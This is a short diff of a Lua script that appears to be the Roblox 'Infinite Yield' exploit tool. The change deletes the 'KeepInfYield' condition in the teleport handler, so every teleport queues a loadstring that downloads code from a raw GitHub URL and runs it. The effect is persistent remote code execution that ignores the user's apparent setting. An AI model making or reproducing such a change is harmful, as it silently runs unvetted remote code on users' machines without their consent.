@@ -941,7 +941,7 @@ queueteleport = missing("function",queue_on_teleport or (syn and syn.queue_on_te
 
 local TeleportCheck = false
 game.Players.LocalPlayer.OnTeleport:Connect(function(State)
-	if KeepInfYield and (not TeleportCheck) and queueteleport then
+	if (not TeleportCheck) and queueteleport then
 		TeleportCheck = true
 		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/daeHtekcuBehT/NNNNNNNNNNNNN/refs/heads/main/main.lua'))()")
 	end
